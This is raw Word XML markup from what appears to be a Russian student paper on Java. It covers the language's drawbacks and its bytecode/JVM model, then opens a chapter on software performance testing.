          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>фреймворков</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, сотнями сообществ и форумов, тысячами библиотек и плагинов. Всё это благоприятно сказывается на пороге вхождения в профессию, востребованности и качеству производимых с помощью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продуктов.</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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Безусловно, каждый популярный язык программирования уникален, каждый имеет свои недостатки и преимущества. Особенности </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> не имеют революционного характера, они незначительны, но вместе с тем фундаментальны. Именно то, что отличает хороший язык от лучшего.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>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 xml:space="preserve">Закончим </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>недостаткими</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> языка</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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Менее быстрый и более требовательный</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Низкое, в сравнении с другими языками, быстродействие, повышенные требования к объему оперативной памяти (ОП).</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Большой объем стандартных библиотек и технологий создает сложности в изучении языка.</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iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Постоянное развитие языка вызывает наличие как устаревших, так и новых средств, имеющих одно и то же функциональное назначение.</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Так же там перечислялись некоторые </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>особенности</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t> языка:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:p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Узконаправленный</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Скорее нейтральное </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>качество</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> чем недостаток но это и делает его </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>узконаправленыым</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> языком так как </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> является полностью объектно-ориентированным языком. Например, C++ тоже является объектно-ориентированным, но в нем есть возможность писать программы не в объектно-ориентированном стиле, а в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> так нельзя.</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Реализован с использованием интерпретации Р-кода (байт-кода). Т.е. программа сначала транслируется в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>машинонезависимый</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> Р-код, а потом интерпретируется некоторой программой-интерпретатором (виртуальная </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>-машина, JVM).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708"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color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">1.6 </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Вывод по главе 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="708" w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
      </w:pP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Язык </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> подходит для вас если вы заинтересованы </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve">в  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>объектно</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>ориентированом</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>програмировании</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> так как он был для этого создан. Подведу итоги недостатков и достоинств: один из лучших языков для ООП и имеет </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">легкий порог вхождения и понимания основных механик, но сложность заключается в дальнейшем так как будет много нового и сложного по сравнению с другими языками, а </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>так же</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> он требователен к оперативной памяти, но за это он гарантирует надежность.</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p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00CD4D49" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>ГЛАВА 2.</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> ТЕСТИРОВАНИЕ ПРОИЗВОДНОСТИ ПРОГРАММ: АОДХОДЫ В ЗАВИСИМОСТИ ОТ КАТЕГОРИЙ ПРИЛОЖЕНИЙ</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>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color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>2.1 Что такое тестирование и их виды</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Тестирование производительности</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>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color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>В </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:tooltip="Инженерия программного обеспечения" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>инженерии программного обеспечения</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> — </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:tooltip="Тестирование программного обеспечения" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>тестирование</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, которое проводится с целью определения, как быстро работает вычислительная система или её часть под определённой </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:tooltip="Нагрузка (значения)" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>нагрузкой</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. Также может служить для проверки и подтверждения других атрибутов качества системы, таких как </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:tooltip="Масштабируемость" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>масштабируемость</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:tooltip="Надёжность" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>надёжность</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> и потребление ресурсов. Тестирование делится на 6 типов:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>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Функциональное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
